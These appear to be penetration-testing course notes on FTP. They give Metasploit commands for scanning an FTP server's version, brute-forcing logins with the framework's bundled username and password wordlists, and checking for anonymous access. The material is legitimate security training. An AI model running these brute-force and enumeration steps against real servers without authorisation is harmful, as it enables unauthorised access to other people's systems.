# FTP
* File Transfer Protocol uses TCP port 21
* Used to facilitate file sharing between a server and client/s.
* USed to transfer files to and from the directory of a web server.
* **How MSF can be used to exploit FTP**
  * Multiple auxiliary modules can be used to enumerate information as well as perform brute-force attacks on targets running an FTP server.
  * Generally FTP servers require a username and password but if impropelry configured, FTP servers can be logged into anonymously.
 
* **PRACTICAL**
* `service postgresql start`
* `msfconsole`
* `workspace -a [name]`
* `use auxiliary/scanner/portscan/tcp`  --> This will just give the port no. but not the service version. So have to go further with -->
* `search type:auxiliary name:ftp` --> This will reduce no. of results
* `use auxiliary/scanner/ftp/ftp_version`
* `set rhosts`
* `run` --> This should give the version no of FTP. Then based on the version, we can search for an exploit in MSF made for that particular version.


* **Brute-force attack with MSF**
  * Brute force attacks can take the service down for a while, so we might have to try several times. OR try logging into FTP after exiting MSF.
  * `use auxiliary/scanner/ftp/ftp_login`
  * WE will use the user's list and password's list that comes with MSF
  * `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_user.txt`
  * `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
  * `set rhosts`
  * `run`
  * Then exit the MSF and --> `ftp [Target IP]`
  * Provide the username and password revealed in the brute-force attack.
    
  * **Check if anonymous login is allowed**
    * `use auxiliary/scanner/ftp/anonymous`
